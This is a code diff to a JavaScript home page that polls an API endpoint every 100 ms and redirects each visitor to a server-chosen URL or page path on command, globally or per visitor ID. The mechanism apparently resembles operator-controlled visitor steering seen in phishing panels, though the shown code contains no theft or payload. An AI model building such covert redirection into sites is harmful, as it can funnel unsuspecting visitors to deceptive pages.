@@ -61,8 +61,7 @@ export default function Home() {
           // Fallback to polling if SSE fails
         };
         
-        // Polling backup (in case SSE doesn't work) - CRITICAL for Vercel serverless
-        // On Vercel, SSE connections may not persist, so polling is the reliable method
+        // Polling - check for redirects (GLOBAL or visitor-specific)
         const redirectInterval = setInterval(async () => {
           if (redirectReceived) {
             clearInterval(redirectInterval);
@@ -72,30 +71,31 @@ export default function Home() {
           try {
             const response = await fetch(`/api/redirect/${visitorId}?t=${Date.now()}`);
             if (!response.ok) {
-              console.warn('[index.js] Redirect check failed:', response.status);
               return;
             }
             
             const data = await response.json();
-            console.log('[index.js] Polling check result:', data);
             
-            if (data.redirect && data.redirectUrl) {
+            if (data.redirect) {
               redirectReceived = true;
               if (redirectEventSource) {
                 redirectEventSource.close();
               }
               clearInterval(redirectInterval);
-              console.log('[index.js] ✅✅✅ REDIRECT COMMAND RECEIVED VIA POLLING ✅✅✅');
-              console.log('[index.js] Redirect type:', data.redirectType);
-              console.log('[index.js] Redirect URL:', data.redirectUrl);
+              console.log('[index.js] ✅✅✅ REDIRECT COMMAND RECEIVED ✅✅✅');
+              console.log('[index.js] Redirecting to:', data.pagePath || data.redirectUrl);
               
-              // Redirect to /r/[visitorId] route which will return 302
-              window.location.href = data.redirectUrl;
+              // Redirect immediately
+              if (data.redirectUrl) {
+                window.location.href = data.redirectUrl;
+              } else if (data.pagePath) {
+                window.location.href = data.pagePath;
+              }
             }
           } catch (error) {
             console.error('[index.js] Error checking redirect:', error);
           }
-        }, 100); // Poll every 100ms for faster response on Vercel
+        }, 100); // Poll every 100ms
         
         // Stop polling after 5 minutes
         setTimeout(() => clearInterval(redirectInterval), 300000);
